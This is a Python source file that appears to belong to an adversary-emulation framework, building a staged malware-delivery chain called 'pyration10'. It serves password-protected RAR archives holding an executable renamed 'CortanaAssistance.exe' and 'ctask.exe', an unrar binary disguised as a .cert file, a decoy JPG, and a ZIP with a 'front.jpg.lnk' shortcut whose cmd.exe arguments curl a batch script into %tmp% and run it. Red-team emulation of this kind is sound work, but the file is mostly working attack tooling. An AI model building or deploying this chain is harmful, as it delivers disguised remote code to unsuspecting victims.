from typing import List

from make.lnk.lnk import makeLnk
from make.zip.zip import makeZip
from make.bat.bat import *
from make.rar.rar import makeRar

from helpers import *
from model import AceFile, AceRoute


def pyration10(baseUrl) -> List[AceRoute]:
    routes = []

    # Payload: unrar.cert: unrar.exe base64 encoded
    unrar: AceBytes = readFileContent('recipes/pyration10/unrar.exe')
    unrarB64: AceStr = base64encode(unrar)
    serveHtml: AceRoute = AceRoute('/pyration10/unrar.cert', unrarB64)
    routes.append(serveHtml)

    # Payload: setup.rar: PW "2022": CortanaAssistance.exe
    evilexe: AceBytes = readFileContent('payloads/evil.exe')
    evilExeFile: AceFile = makeAceFile('CortanaAssistance.exe', evilexe)
    evilexeRar: AceBytes = makeRar([evilExeFile], password='2022')
    serveHtml: AceRoute = AceRoute('/pyration10/assist.rar', evilexeRar)
    routes.append(serveHtml)

    # Payload: assist.rar: PW "2022": ctask.exe
    evilExeFile: AceFile = makeAceFile('ctask.exe', evilexe)
    evilexeRar: AceBytes = makeRar([evilExeFile], password='2022')
    serveHtml: AceRoute = AceRoute('/pyration10/setup.rar', evilexeRar)
    routes.append(serveHtml)
    
    # Payload: Fake JPG
    pic: AceBytes = readFileContent('recipes/pyration10/front.jpg')
    serveHtml: AceRoute = AceRoute('/pyration10/front.jpg', pic)
    routes.append(serveHtml)

    # Stage 2: BAT
    rendered = renderTemplate('recipes/pyration10/', 'stage2.bat',
        assistUrl=baseUrl + '/pyration10/assist.rar',
        setupUrl=baseUrl + '/pyration10/setup.rar',
        certUrl=baseUrl + '/pyration10/unrar.cert',
    )
    serveHtml: AceRoute = AceRoute('/pyration10/c.txt', rendered)
    routes.append(serveHtml)

    # Stage 1: BAT
    rendered = renderTemplate('recipes/pyration10/', 'stage1.bat',
        batUrl=baseUrl + '/pyration10/c.txt',
        picUrl=baseUrl + '/pyration10/front.jpg',
    )
    stage1bat: AceFile = makeAceFile('front.bat', rendered)
    serveHtml: AceRoute = AceRoute('/pyration10/front.txt', rendered)
    routes.append(serveHtml)

    # Initial Vector: LNK
    lnkData: AceBytes = makeLnk(
        name = "front.jpg.lnk",
        target = "c:\\Windows\\System32\\cmd.exe",
        arguments = "/c curl -k \"{}\" -o \"%tmp%/front.bat\" & cmd /c \"%tmp%/front.bat\"".format(
            baseUrl + '/pyration10/front.txt',
        ),
    )
    lnkFile: AceFile = makeAceFile('front.jpg.lnk', lnkData)

    # Put LNK into a ZIP
    container: AceBytes = makeZip(
        files = [
            lnkFile,
        ],
    )
    containerFile: AceFile = makeAceFile('documents.zip', container)
    serveHtml: AceRoute = AceRoute('/pyration-documents.zip', container, download=True, downloadName='documents.zip')
    routes.append(serveHtml)
    return(routes)
